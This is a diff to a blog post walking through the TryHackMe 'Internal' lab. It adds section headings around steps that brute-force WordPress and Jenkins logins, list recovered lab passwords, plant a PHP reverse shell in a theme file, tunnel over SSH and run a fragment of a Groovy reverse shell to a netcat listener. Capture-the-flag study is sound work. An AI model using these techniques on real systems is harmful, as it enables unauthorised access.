@@ -5,6 +5,8 @@ title = 'Internal Walkthrough'
 tags = ["TryHackMe"]
 +++
 
+## Initial Enumeration
+
 So lets deploy the machine and start enumerating.
 
 ![internal1](/images/internal/0.png)
@@ -33,6 +35,8 @@ It is necessary to add internal.thm to our /etc/hosts file to navigate through t
 
 Since we know admin is a user because he has a post on the website, we can brute force the login page using wpscan and rockyou.txt for the password.
 
+## WordPress Access
+
 ![](/images/internal/3.png)
 
 So we found admin:my2boys as valid credentials now we can log in.
@@ -40,6 +44,8 @@ So we found admin:my2boys as valid credentials now we can log in.
 Now if we go to Appearence we can see some php files, let's create edit them and add our php reverse shell. Later with a nc listener we can get access. [http://internal.thm/blog/wp-content/themes/twentyseventeen/search.php](http://internal.thm/blog/wp-content/themes/twentyseventeen/search.php)
 
 ![](/images/internal/4.png)
+
+## Initial Shell
 
 Now just access link of the edited php file and we are in.
 
@@ -63,6 +69,8 @@ Enumerating a little bit more trying to locate .txt for flags we find intersting
 
 ![](/images/internal/6.png)
 
+## SSH Pivot
+
 aubreanna:bubb13guM!@#123 Now we can connect through ssh.
 
 Once in we see a txt file with a jenkins server which is not reachable from our machine. We need to do SSH tunneling to forward that server so we are able to reach it from our machine.
@@ -72,6 +80,8 @@ Once in we see a txt file with a jenkins server which is not reachable from our 
 Now from port 3333 we can access the server.
 
 ![](/images/internal/8.png)
+
+## Jenkins Access
 
 Now we use hydra to burteforce admin user on jenkins.
 
@@ -94,6 +104,8 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 {p.exitValue();break;}catch (Exception e){\}};p.destroy();s.close(); With a netcat listener we get access.
 ```
+
+## Privilege Escalation
 
 So once in the system we use find command to locate files like we did to see if we get something interesting.
 
